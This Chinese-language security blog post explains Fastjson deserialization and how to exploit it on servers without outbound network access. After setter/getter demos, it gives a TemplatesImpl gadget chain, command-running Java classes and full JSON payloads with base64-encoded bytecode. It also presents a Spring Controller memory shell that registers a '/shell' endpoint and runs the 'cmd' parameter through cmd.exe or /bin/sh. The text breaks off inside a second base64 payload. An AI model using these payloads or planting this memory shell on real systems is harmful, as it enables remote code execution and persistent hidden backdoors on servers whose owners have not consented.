#  Fastjson不出网利用总结

private null  [ 轩公子谈技术 ](javascript:void\(0\);)

**轩公子谈技术** ![]()

微信号 linux_hack

功能介绍 安全笔记分享 擅长渗透测试，内网渗透，代码审计，物联网娱乐者

____

___发表于_

收录于合集 #fastjson 1个

废话不多说，直接上干货

## POC的演变过程

编写一个User类

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    package com.exmple;  
    public class User {    private String name;    private int age;  
        public User() {        System.out.println("调用空参构造");    }    public User(String name, int age) {        System.out.println("调用形参构造");        this.name = name;        this.age = age;    }    public String getName() {        System.out.println("调用getName()");        return name;    }    public void setName(String name) {        System.out.println("调用setName()");        this.name = name;    }    public int getAge() {        System.out.println("调用getAge()");        return age;    }    public void setAge(int age) {        System.out.println("调用setAge()");        this.age = age;    }    @Override    public String toString() {        return "User{" +                "name='" + name + '\'' +                ", age=" + age +                '}';    }}  
    

假设没有fastjson，我们想要序列化一个数据应该怎么写

  *   *   *   * 

    
    
    User user = new User("lisi",20);System.out.println(user);  
    // User{name='lisi', age=20}

使用序列化

  *   *   * 

    
    
    User user = new User("lisi", 20);String serializedStr = JSON.toJSONString(user);System.out.println(serializedStr);

![](https://gitee.com/fuli009/images/raw/master/public/20230320091735.png)

通过parse方法进行反序列化

  *   *   *   *   * 

    
    
    User user = new User("lisi", 20);String serializedStr = JSON.toJSONString(user);Object obj1 = JSON.parse(serializedStr);System.out.println("parse反序列化对象名称:"+obj1.getClass().getName());System.out.println("parse反序列化："+obj1);

![](https://gitee.com/fuli009/images/raw/master/public/20230320091736.png)

通过parseObject进行反序列化，不指定类

  *   *   *   *   * 

    
    
    User user = new User("lisi", 20);String serializedStr = JSON.toJSONString(user);Object obj2 = JSON.parseObject(serializedStr);System.out.println("parseObject反序列化对象名称:"+obj2.getClass().getName());System.out.println("parseObject反序列化:"+obj2);

![](https://gitee.com/fuli009/images/raw/master/public/20230320091738.png)

通过parseObject,指定类

  *   *   *   *   * 

    
    
    User user = new User("lisi", 20);String serializedStr = JSON.toJSONString(user);Object obj3 = JSON.parseObject(serializedStr,User.class);System.out.println("parseObject反序列化对象名称:"+obj3.getClass().getName());System.out.println("parseObject反序列化:"+obj3);

![](https://gitee.com/fuli009/images/raw/master/public/20230320091739.png)

返回结果可知：parseObject("",class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法

JSON.toJSONString存在3个重载方法，使用toJSONString(Object object, SerializerFeature...
features)方法

![](https://gitee.com/fuli009/images/raw/master/public/20230320091741.png)

  *   *   *   * 

    
    
    User user = new User("lisi",12);//不写User.class 让它自己去调用String serializedStr1 = JSON.toJSONString(user,SerializerFeature.WriteClassName); System.out.println(serializedStr1);

![](https://gitee.com/fuli009/images/raw/master/public/20230320091743.png)

发现输出中存在"@type":"com.exmple.User"，对其反序列化

  *   *   *   *   * 

    
    
    User user = new User("lisi",20);String serializedStr = JSON.toJSONString(user);String serializedStr1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);System.out.println(JSON.parse(serializedStr).getClass().toString());System.out.println(JSON.parseObject(serializedStr1).getClass().toString());

![](https://gitee.com/fuli009/images/raw/master/public/20230320091744.png)

由此得出结论：

不指定@type不会调用构造方法和setter  
指定@type时，parse只会调用构造方法和特定setter，而parseObject会额外调用getter

最终fastjosn的poc的格式为

  * 

    
    
    {"@type":"java.net.InetAddress","val":"example.com"}

## TemplatesImpl利用链举例

这里的参数对应其内部的每个变量

条件：1.2.24

1. 服务端使用parseObject()时，必须使用如下格式才能触发漏洞： JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);

这是因为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl需要赋值的一些属性为private
属性，服务端必须添加特性才回去从json中恢复private属性的数据。故此利用链利用条件局限性较大，看运气才能遇见。

![](https://gitee.com/fuli009/images/raw/master/public/20230320091746.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230320091748.png)

创建恶意类

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    package com.exmple;  
    import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;  
    public class Shell extends AbstractTranslet{    public static void main(String[] args) {        try {            Runtime.getRuntime().exec("open -a calculator");        } catch (IOException e) {            e.printStackTrace();        }    }    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws            TransletException {    }    @Override    public void transform(DOM document, DTMAxisIterator iterator,                          SerializationHandler handler) throws TransletException {    }}  
    

base64加密

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    package com.exmple;  
    import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.util.Base64;  
    public class FiletoBase64 {    public static String FiletoBase64(String filename) throws IOException {        File file = new File(filename);        FileInputStream io = new FileInputStream(file);        ByteArrayOutputStream os = new ByteArrayOutputStream();        byte[] buf = new byte[10240];        int len;        while ((len = io.read(buf)) > 0) {            os.write(buf, 0, len);        }        io.close();        String s = Base64.getEncoder().encodeToString(os.toByteArray());        return s;    }}  
    

主类

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    package com.exmple;  
    import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import com.alibaba.fastjson.parser.Feature;  
    import java.io.IOException;  
    public class Demo {    public static void main(String[] args) {  
            String shell = null;        try {            shell = FiletoBase64.filetoBase64("/Users/ajie/Desktop/fastjson/target/classes/com/exmple/Shell.class");        } catch (IOException e) {            e.printStackTrace();        }        String payload1 = " {\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\""+shell+"\"],\"_name\":\"a.b\",\"_tfactory\":{},\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";        System.out.println(payload1);        JSONObject obj = JSON.parseObject(payload1, Feature.SupportNonPublicField);        System.out.println(obj);    }}  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230320091750.png)

##

靶场复现

  * 

    
    
    {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAOQoACQApCgAqACsIACwKACoALQcALgoABQAvBwAwCgAHACkHADEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEABHRoaXMBABJMY29tL2V4bXBsZS9TaGVsbDsBAA1TdGFja01hcFRhYmxlBwAwBwAuAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHADIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAKU2hlbGwuamF2YQwACgALBwAzDAA0ADUBABJ0b3VjaCAvdG1wL2FhYS50eHQMADYANwEAE2phdmEvaW8vSU9FeGNlcHRpb24MADgACwEAEGNvbS9leG1wbGUvU2hlbGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACQAAAAAABAABAAoACwABAAwAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAA0AAAAaAAYAAAALAAQADQANABAAEAAOABEADwAVABEADgAAABYAAgARAAQADwAQAAEAAAAWABEAEgAAABMAAAAQAAL/ABAAAQcAFAABBwAVBAABABYAFwACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAFAAOAAAAIAADAAAAAQARABIAAAAAAAEAGAAZAAEAAAABABoAGwACABwAAAAEAAEAHQABABYAHgACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAGAAOAAAAKgAEAAAAAQARABIAAAAAAAEAGAAZAAEAAAABAB8AIAACAAAAAQAhACIAAwAcAAAABAABAB0ACQAjACQAAQAMAAAANwACAAEAAAAJuwAHWbcACFexAAAAAgANAAAACgACAAAAGwAIABwADgAAAAwAAQAAAAkAJQAmAAAAAQAnAAAAAgAo"],"_name":"a.b","_tfactory":{},"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}

![](https://gitee.com/fuli009/images/raw/master/public/20230320091752.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230320091753.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230320091756.png)

### TemplatesImpl内存马

编写内存马需要加入一下依赖，否则编译报错  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <dependency>  <groupId>org.springframework</groupId>  <artifactId>spring-web</artifactId>  <version>5.1.9.RELEASE</version></dependency><dependency>  <groupId>javax.servlet</groupId>  <artifactId>javax.servlet-api</artifactId>  <version>4.0.1</version></dependency><dependency>  <groupId>org.springframework</groupId>  <artifactId>spring-webmvc</artifactId>  <version>5.0.14.RELEASE</version></dependency>  
    

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    package com.exmple;  
    import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.PrintWriter;import java.lang.reflect.Method; //回显spring Controller内存马 public class TemplatesImplSpringController extends AbstractTranslet {    public TemplatesImplSpringController() throws Exception{        super();        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.                currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);         RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");        method.setAccessible(true);        Method method2 = TemplatesImplSpringController.class.getMethod("test");        PatternsRequestCondition url = new PatternsRequestCondition("/shell");        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);        TemplatesImplSpringController inject = new TemplatesImplSpringController("aaa");        mappingHandlerMapping.registerMapping(info, inject, method2);     }    public TemplatesImplSpringController(String aaa) {     }    public void test() throws Exception {        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();         try {            String arg0 = request.getParameter("cmd");            PrintWriter writer = response.getWriter();            if (arg0 != null) {                String o = "";                java.lang.ProcessBuilder p;                if (System.getProperty("os.name").toLowerCase().contains("win")) {                    p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});                } else {                    p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});                }                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");                o = c.hasNext() ? c.next() : o;                c.close();                writer.write(o);                writer.flush();                writer.close();            } else {                response.sendError(404);            }        } catch (Exception e) {        }    }    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {     }     @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {     }  
        public static void main(String[] args) {        try {            new TemplatesImplSpringController();        } catch (Exception e) {            e.printStackTrace();        }    }}

编译后的class文件，将内容转换为base64，然后打入poc

  * 

    
    
    {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQA/AoAPwCDCgCEAIUIAIYLAIcAiAcAiQcAigsABQCLCACMCgALAI0IAI4HAI8KAAsAkAoAkQCSBwCTCABZCgALAJQHAJUHAJYIAJcKABEAmAcAmQcAmgoAFQCbBwCcCgAYAJ0IAFcKAA4AngoABgCfBwCgCgAdAKEKAB0AoggAowsApAClCwCmAKcIAKgIAKkKAKoAqwoAEgCsCACtCgASAK4HAK8IALAIALEKACkAmAgAsggAswcAtAoAKQC1CgC2ALcKAC8AuAgAuQoALwC6CgAvALsKAC8AvAoALwC9CgC+AL8KAL4AwAoAvgC9CwCmAMEHAMIKAA4AgwoAPADDBwDEAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACpMY29tL2V4bXBsZS9UZW1wbGF0ZXNJbXBsU3ByaW5nQ29udHJvbGxlcjsBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEABm1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAHbWV0aG9kMgEAA3VybAEASExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAAm1zAQBOTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247AQAEaW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEABmluamVjdAEACkV4Y2VwdGlvbnMBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAANhYWEBABJMamF2YS9sYW5nL1N0cmluZzsBAAR0ZXN0AQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQABbwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAEYXJnMAEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAA1TdGFja01hcFRhYmxlBwCTBwDFBwDGBwCWBwDHBwCvBwC0BwDCAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcAyAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAiVGVtcGxhdGVzSW1wbFNwcmluZ0NvbnRyb2xsZXIuamF2YQwAQABBBwDJDADKAMsBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHAMwMAM0AzgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwAzwDQAQBEb3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuc2VydmxldC5oYW5kbGVyLkFic3RyYWN0SGFuZGxlck1ldGhvZE1hcHBpbmcMANEA0gEAEmdldE1hcHBpbmdSZWdpc3RyeQEAD2phdmEvbGFuZy9DbGFzcwwA0wDUBwDVDADWANcBAChjb20vZXhtcGxlL1RlbXBsYXRlc0ltcGxTcHJpbmdDb250cm9sbGVyDADYANQBAEZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uAQAQamF2YS9sYW5nL1N0cmluZwEABi9zaGVsbAwAQAB8AQBMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kDABAANkBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDABAANoMAEAAVgwA2wDcAQBAb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1NlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwwA3QDeDADfAOABAANjbWQHAMUMAOEA4gcAxgwA4wDkAQAAAQAHb3MubmFtZQcA5QwA5gDiDADnAOgBAAN3aW4MAOkA6gEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAB2NtZC5leGUBAAIvYwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyDADrAOwHAO0MAO4A7wwAQADwAQACXEEMAPEA8gwA8wD0DAD1AOgMAPYAQQcAxwwA9wBWDAD4AEEMAPkA+gEAE2phdmEvbGFuZy9FeGNlcHRpb24MAPsAQQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2lvL1ByaW50V3JpdGVyAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEACWdldE1ldGhvZAEAOyhbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kOylWAQH2KExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGFyYW1zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0hlYWRlcnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUHJvZHVjZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdENvbmRpdGlvbjspVgEAD3JlZ2lzdGVyTWFwcGluZwEAQShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOylWAQAKZ2V0UmVxdWVzdAEAKSgpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQALZ2V0UmVzcG9uc2UBACooKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEABWNsb3NlAQAFd3JpdGUBAAVmbHVzaAEACXNlbmRFcnJvcgEABChJKVYBAA9wcmludFN0YWNrVHJhY2UAIQAOAD8AAAAAAAYAAQBAAEEAAgBCAAABLQAJAAkAAACHKrcAAbgAAhIDA7kABAMAwAAFTCsSBrkABwIAwAAGTRIIuAAJEgoDvQALtgAMTi0EtgANEg4SDwO9AAu2ABA6BLsAEVkEvQASWQMSE1O3ABQ6BbsAFVkDvQAWtwAXOga7ABhZGQUZBgEBAQEBtwAZOge7AA5ZEhq3ABs6CCwZBxkIGQS2AByxAAAAAgBDAAAAMgAMAAAAGQAEABsAEwAdAB8AHgAuAB8AMwAgAEAAIQBSACIAXwAjAHEAJAB8ACUAhgAnAEQAAABcAAkAAACHAEUARgAAABMAdABHAEgAAQAfAGgASQBKAAIALgBZAEsATAADAEAARwBNAEwABABSADUATgBPAAUAXwAoAFAAUQAGAHEAFgBSAFMABwB8AAsAVABGAAgAVQAAAAQAAQA8AAEAQABWAAEAQgAAAD0AAQACAAAABSq3AAGxAAAAAgBDAAAACgACAAAAKAAEACoARAAAABYAAgAAAAUARQBGAAAAAAAFAFcAWAABAAEAWQBBAAIAQgAAAdcABgAIAAAAzbgAAsAAHcAAHbYAHky4AALAAB3AAB22AB9NKxIguQAhAgBOLLkAIgEAOgQtxgCTEiM6BRIkuAAltgAmEie2ACiZACG7AClZBr0AElkDEipTWQQSK1NZBS1TtwAsOganAB67AClZBr0AElkDEi1TWQQSLlNZBS1TtwAsOga7AC9ZGQa2ADC2ADG3ADISM7YANDoHGQe2ADWZAAsZB7YANqcABRkFOgUZB7YANxkEGQW2ADgZBLYAORkEtgA6pwAMLBEBlLkAOwIApwAETrEAAQAaAMgAywA8AAMAQwAAAFIAFAAAACwADQAtABoAMAAjADEAKwAyAC8AMwAzADUAQwA2AGEAOAB8ADoAkgA7AKYAPACrAD0AsgA+ALcAPwC8AEAAvwBBAMgARADLAEMAzABFAEQAAABcAAkAXgADAFoAWwAGADMAiQBcAFgABQB8AEAAWgBbAAYAkgAqAF0AXgAHACMApQBfAFgAAwArAJ0AYABhAAQAAADNAEUARgAAAA0AwABiAGMAAQAaALMAZABlAAIAZgAAADYACP8AYQAGBwBnBwBoBwBpBwBqBwBrBwBqAAD8ABoHAGz8ACUHAG1BBwBq+AAa+QAIQgcAbgAAVQAAAAQAAQA8AAEAbwBwAAIAQgAAAD8AAAADAAAAAbEAAAACAEMAAAAGAAEAAABJAEQAAAAgAAMAAAABAEUARgAAAAAAAQBxAHIAAQAAAAEAcwB0AAIAVQAAAAQAAQB1AAEAbwB2AAIAQgAAAEkAAAAEAAAAAbEAAAACAEMAAAAGAAEAAABOAEQAAAAqAAQAAAABAEUARgAAAAAAAQBxAHIAAQAAAAEA